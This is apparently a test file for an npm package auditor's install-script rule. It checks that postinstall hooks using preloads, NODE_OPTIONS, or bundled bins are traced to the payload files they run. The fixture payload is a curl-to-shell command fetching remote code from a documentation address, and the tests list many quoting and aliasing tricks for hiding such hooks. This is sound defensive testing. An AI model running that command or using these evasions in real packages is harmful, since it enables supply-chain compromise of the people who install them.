import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// install-scripts resolves bare module names, extension-less preloads and bundled bins against the tarball only.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const PAYLOAD = `${CURL_SH}\n`;
const BENIGN = "console.log(1)\n";

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const sev = (hook: string, files: Record<string, string>) =>
  runRules(inputFor({ ...files, "package/package.json": JSON.stringify({ scripts: { postinstall: hook } }) }))
    .filter((x) => x.ruleId === "install-scripts").map((x) => x.severity);

/** `hook` is critical when `path` holds the payload and low when it holds a benign file. */
function row(label: string, hook: string, path: string, extra: Record<string, string> = {}) {
  test(`${label}: \`${hook}\``, () => {
    assert.deepEqual(sev(hook, { ...extra, [path]: PAYLOAD }), ["critical"]);
    assert.deepEqual(sev(hook, { ...extra, [path]: BENIGN }), ["low"]);
  });
}
const setup = { "package/setup.js": BENIGN };

describe("preloads from bundled modules", () => {
  row("bare specifier, index.js", "node -r evil setup.js", "package/node_modules/evil/index.js", setup);
  row("bare specifier, file", "node -r evil setup.js", "package/node_modules/evil", setup);
  row("bare specifier, .js", "node --require evil setup.js", "package/node_modules/evil.js", setup);
  row("bare specifier, package main", "node --import evil setup.js", "package/node_modules/evil/lib/run.js", {
    ...setup, "package/node_modules/evil/package.json": '{"main":"lib/run"}',
  });
  row("scoped specifier with a subpath", "node --loader @a/b/x setup.js", "package/node_modules/@a/b/x.js", setup);
  row("extension-less relative value", "node --require=./hook setup.js", "package/hook.js", setup);

  test("a bare specifier that is not shipped resolves nothing", () => {
    assert.deepEqual(sev("node -r evil setup.js", { ...setup, "package/lib/evil/index.js": PAYLOAD }), ["low"]);
  });
  test("a bundled dotenv/config with benign content stays clean", () => {
    assert.deepEqual(sev("node -r dotenv/config setup.js", { ...setup, "package/node_modules/dotenv/config.js": BENIGN }), ["low"]);
  });
});

describe("NODE_OPTIONS and VAR=value prefixes", () => {
  row("extension-less relative value", "NODE_OPTIONS=--require=./hook node -v", "package/hook.js");
  row("flag and value as separate words in quotes", "NODE_OPTIONS='-r ./hook.js' node -v", "package/hook.js");
  row("double-quoted flag and value", 'NODE_OPTIONS="--require ./hook" node -v', "package/hook.js");
  row("bare specifier", "NODE_OPTIONS=--require=evil node -v", "package/node_modules/evil/index.js");
  row("bare specifier, quoted separate words", "NODE_OPTIONS='-r evil' node -v", "package/node_modules/evil/index.js");
  row("a wrapper before the command", "NODE_OPTIONS='-r evil' env node -v", "package/node_modules/evil/index.js");

  test("a quoted value that never closes does not swallow the command", () => {
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook node setup.js", { ...setup, "package/hook.js": BENIGN }), ["low"]);
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook node setup.js", { "package/setup.js": PAYLOAD }), ["critical"]);
  });
});

describe("round 2 hardening", () => {
  test("60,000 unclosed quoted assignments finish quickly", () => {
    const t0 = performance.now();
    assert.deepEqual(sev(`${"A='x ".repeat(60000)}node setup.js`, { "package/setup.js": PAYLOAD }), ["critical"]);
    const ms = performance.now() - t0;
    assert.ok(ms < 1000, `took ${ms} ms`);
  });
  test("words a quoted assignment spans are still processed as commands", () => {
    assert.deepEqual(sev("A='x node setup.js y'", { "package/setup.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("A='x node setup.js y'", { "package/setup.js": BENIGN }), ["low"]);
  });
  test("every package declaring a bin is scanned, whatever the tar order", () => {
    const a = { "package/node_modules/a/package.json": '{"bin":{"evil":"x.js"}}', "package/node_modules/a/x.js": BENIGN };
    const b = { "package/node_modules/b/package.json": '{"bin":{"evil":"y.js"}}', "package/node_modules/b/y.js": PAYLOAD };
    assert.deepEqual(sev("evil", { ...a, ...b }), ["critical"]);
    assert.deepEqual(sev("evil", { ...b, ...a }), ["critical"]);
    assert.deepEqual(sev("evil", { ...a, "package/node_modules/.bin/evil": BENIGN, ...b }), ["critical"]);
    // the exact .bin file alone is dangerous
    assert.deepEqual(sev("evil", { ...a, "package/node_modules/b/package.json": b["package/node_modules/b/package.json"], "package/node_modules/b/y.js": BENIGN, "package/node_modules/.bin/evil": PAYLOAD }), ["critical"]);
  });
  test("a preload flag is parsed only as a flag, with its value unquoted", () => {
    const mod = { "package/node_modules/logger/index.js": PAYLOAD };
    assert.deepEqual(sev("node --require='logger' setup.js", { ...setup, ...mod }), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS=--require='logger' node -v", mod), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS=--title=--require=logger node -v", mod), ["low"]);
  });
  test("bin targets are exact normalized paths: no .js appended, no `..`", () => {
    const pkg = (bin: string) => ({ "package/node_modules/evil/package.json": JSON.stringify({ bin }) });
    assert.deepEqual(sev("evil", { ...pkg("cli"), "package/node_modules/evil/cli.js": PAYLOAD }), ["low"]);
    // `..` is clamped at the package root, as npm does
    assert.deepEqual(sev("evil", { ...pkg("../cli.js"), "package/node_modules/evil/cli.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("evil", { ...pkg("../outside.js"), "package/node_modules/outside.js": PAYLOAD }), ["low"]);
    assert.deepEqual(sev("evil", { ...pkg("bin\\cli.js"), "package/node_modules/evil/bin/cli.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("evil", { "package/node_modules/evil/package.json": '{"bin":{"sub/evil":"cli.js"}}', "package/node_modules/evil/cli.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("evil", { ...pkg("./bin/../cli.js"), "package/node_modules/evil/cli.js": PAYLOAD }), ["critical"]);
  });
  test("shell builtins skip the bin lookup unless a wrapper dispatches them", () => {
    const bins = { "package/node_modules/.bin/echo": PAYLOAD };
    assert.deepEqual(sev("echo ready", bins), ["low"]);
    assert.deepEqual(sev("env echo ready", bins), ["critical"]);
    assert.deepEqual(sev("sudo echo ready", bins), ["critical"]);
  });
  test("a package that cannot be enumerated cheaply fails closed: every code file in it counts", () => {
    const long = "a".repeat(215);
    const dir = `package/node_modules/${long}`;
    assert.deepEqual(sev("evil", { [`${dir}/package.json`]: '{"bin":{"evil":"cli.js"}}', [`${dir}/cli.js`]: BENIGN, [`${dir}/lib/other.js`]: PAYLOAD }), ["critical"]);
    assert.deepEqual(sev(`node -r ${long} setup.js`, { ...setup, [`${dir}/lib/other.js`]: PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("evil", { [`${dir}/package.json`]: '{"bin":{"evil":"cli.js"}}', [`${dir}/lib/other.js`]: BENIGN }), ["low"]);
    // an `exports` map over the node bound
    const exports: Record<string, string> = {};
    for (let i = 0; i < 1100; i++) exports[`./f${i}`] = `./f${i}.js`;
    const big = { "package/node_modules/evil/package.json": JSON.stringify({ exports }), "package/node_modules/evil/hidden/run.js": PAYLOAD };
    assert.deepEqual(sev("node -r evil setup.js", { ...setup, ...big }), ["critical"]);
    assert.deepEqual(sev("node -r evil setup.js", { ...setup, ...big, "package/node_modules/evil/hidden/run.js": BENIGN }), ["low"]);
  });
  test("a quoted assignment resumes prefix parsing after its closing quote", () => {
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook' node setup", { "package/hook.js": BENIGN, "package/setup": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS='-r ./hook' node setup", { "package/hook.js": BENIGN, "package/setup": BENIGN }), ["low"]);
    assert.deepEqual(sev("A='x y' NODE_OPTIONS=--require=./h.js node -v", { "package/h.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("A='x y' NODE_OPTIONS=--require=./h.js node -v", { "package/h.js": BENIGN }), ["low"]);
  });
  test("option tokens are the union of a quote-aware and a plain whitespace split", () => {
    const mod = { "package/node_modules/evil/index.js": PAYLOAD };
    // Node's own tokenizer may differ from ours, so text that only a plain split sees as a flag is followed too
    assert.deepEqual(sev('NODE_OPTIONS=--title="a --require evil" node -v', mod), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS='--title=\"a --require evil\"' node -v", mod), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS=--title=x node -v", mod), ["low"]);
  });
  test("a bin key is normalized as npm does: separators and colons, then the basename", () => {
    const pkg = (key: string) => ({ "package/node_modules/evil/package.json": JSON.stringify({ bin: { [key]: "cli.js" } }), "package/node_modules/evil/cli.js": PAYLOAD });
    assert.deepEqual(sev("evil", pkg("foo:evil")), ["critical"]);
    assert.deepEqual(sev("evil", pkg("foo\\evil")), ["critical"]);
    assert.deepEqual(sev("foo:evil", pkg("foo:evil")), ["low"]);
  });
  test("a fail-closed package counts every retained file, not only code", () => {
    const dir = `package/node_modules/${"a".repeat(215)}`;
    assert.deepEqual(sev("evil", { [`${dir}/package.json`]: '{"bin":{"evil":"cli.js"}}', [`${dir}/notes.txt`]: PAYLOAD }), ["critical"]);
    const exports: Record<string, string> = {};
    for (let i = 0; i < 1100; i++) exports[`./f${i}`] = `./f${i}.js`;
    const big = { "package/node_modules/evil/package.json": JSON.stringify({ exports }), "package/node_modules/evil/data/blob": PAYLOAD };
    assert.deepEqual(sev("node -r evil setup.js", { ...setup, ...big }), ["critical"]);
  });
  test("many bin aliases of a fail-closed package merge its file list once", () => {
    const dir = `package/node_modules/${"a".repeat(215)}`;
    const bin: Record<string, string> = {};
    for (let i = 0; i < 20000; i++) bin[`b${i}`] = "cli.js";
    const files: Record<string, string> = { [`${dir}/package.json`]: JSON.stringify({ bin }) };
    for (let i = 0; i < 1500; i++) files[`${dir}/lib/f${i}.js`] = BENIGN;
    const t0 = performance.now();
    assert.deepEqual(sev(Array.from({ length: 20000 }, (_, i) => `b${i}`).join(" && "), files), ["low"]);
    const ms = performance.now() - t0;
    assert.ok(ms < 1000, `took ${ms} ms`);
  });
  test("a span ends where the quote state is balanced, across words that reopen a quote", () => {
    assert.deepEqual(sev("A='x y'z'w q' node setup", { "package/setup": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("A='x y'z'w q' node setup", { "package/setup": BENIGN }), ["low"]);
  });
  test("NODE_OPTIONS is also scanned after shell quote removal", () => {
    assert.deepEqual(sev("NODE_OPTIONS=--require=./a'b'.js node -v", { "package/ab.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("NODE_OPTIONS=--require=./a'b'.js node -v", { "package/ab.js": BENIGN }), ["low"]);
  });
  test("a closing quote followed by an unquoted suffix still ends the span", () => {
    assert.deepEqual(sev("A='x y'z NODE_OPTIONS=--require=./h node -v", { "package/h.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("A='x y'z NODE_OPTIONS=--require=./h node -v", { "package/h.js": BENIGN }), ["low"]);
  });
  test("xargs hands its command operand to the bundled-bin lookup", () => {
    assert.deepEqual(sev("xargs evil-bin", { "package/node_modules/.bin/evil-bin": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("xargs evil-bin", { "package/node_modules/.bin/evil-bin": BENIGN }), ["low"]);
  });
  test("a dotted relative preload gets .js after a cd too", () => {
    assert.deepEqual(sev("cd scripts && node -r ./hook.prod setup.js", { ...setup, "package/scripts/hook.prod.js": PAYLOAD }), ["critical"]);
  });
  test("a package referenced many times is merged once: stays fast", () => {
    const exports: Record<string, string> = {};
    for (let i = 0; i < 900; i++) exports[`./f${i}`] = `./f${i}.js`;
    const files = { ...setup, "package/node_modules/evil/package.json": JSON.stringify({ exports }) };
    const t0 = performance.now();
    assert.deepEqual(sev(`node ${"-r evil ".repeat(20000)}setup.js`, files), ["low"]);
    const ms = performance.now() - t0;
    assert.ok(ms < 1000, `took ${ms} ms`);
  });
  test("shell builtins outside the portable set still look up bundled bins", () => {
    assert.deepEqual(sev("let x", { "package/node_modules/.bin/let": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("pwd", { "package/node_modules/.bin/pwd": PAYLOAD }), ["low"]);
  });
  row("a dotted relative preload gets .js", "node -r ./hook.prod setup.js", "package/hook.prod.js", setup);
  row("a bundled module reachable only through exports", "node -r evil setup.js", "package/node_modules/evil/lib/cjs.js", {
    ...setup, "package/node_modules/evil/package.json": '{"exports":{".":{"import":"./esm.mjs","require":"./lib/cjs.js"}}}',
  });
  row("a bundled module as .mjs", "node --import evil setup.js", "package/node_modules/evil.mjs", setup);
});

describe("commands from bundled bins", () => {
  row("node_modules/.bin", "evil-bin", "package/node_modules/.bin/evil-bin");
  row("bin as a string", "evil", "package/node_modules/evil/cli.js", { "package/node_modules/evil/package.json": '{"bin":"cli.js"}' });
  row("bin as an object", "evil-bin --flag", "package/node_modules/evil/bin/run", {
    "package/node_modules/evil/package.json": '{"bin":{"evil-bin":"./bin/run"}}',
  });
  row("scoped package bin string", "evil", "package/node_modules/@s/evil/cli.js", { "package/node_modules/@s/evil/package.json": '{"bin":"cli.js"}' });
  row("after a wrapper", "env evil-bin", "package/node_modules/.bin/evil-bin");

  test("a command that no bundled package provides resolves nothing", () => {
    assert.deepEqual(sev("evil-bin", { "package/node_modules/evil/package.json": '{"bin":{"other":"cli.js"}}', "package/node_modules/evil/cli.js": PAYLOAD }), ["low"]);
  });
  test("a malformed bundled package.json is ignored", () => {
    assert.deepEqual(sev("evil", { "package/node_modules/evil/package.json": "{not json", "package/node_modules/evil/cli.js": PAYLOAD }), ["low"]);
  });
});

describe("Node built-ins are not bundled modules", () => {
  test("`-r buffer` and `NODE_OPTIONS=--require=util` load core modules, not bundled copies", () => {
    const dangerous = `${CURL_SH}\n`;
    for (const hook of ["node -r buffer -v", "NODE_OPTIONS=--require=util node -v", "node -r node:events -v", "node -r fs/promises -v"]) {
      const files: Record<string, string> = {
        "package/node_modules/buffer/index.js": dangerous, "package/node_modules/util/index.js": dangerous,
        "package/node_modules/events/index.js": dangerous, "package/node_modules/fs/promises.js": dangerous,
      };
      assert.ok(!sev(hook, files).includes("critical"), hook);
    }
  });
});

describe("only exact built-in names skip bundled resolution", () => {
  test("`-r buffer/evil` resolves the bundled file Node actually loads", () => {
    assert.ok(sev("node -r buffer/evil -v", { "package/node_modules/buffer/evil.js": `${CURL_SH}\n` }).includes("critical"));
  });
});
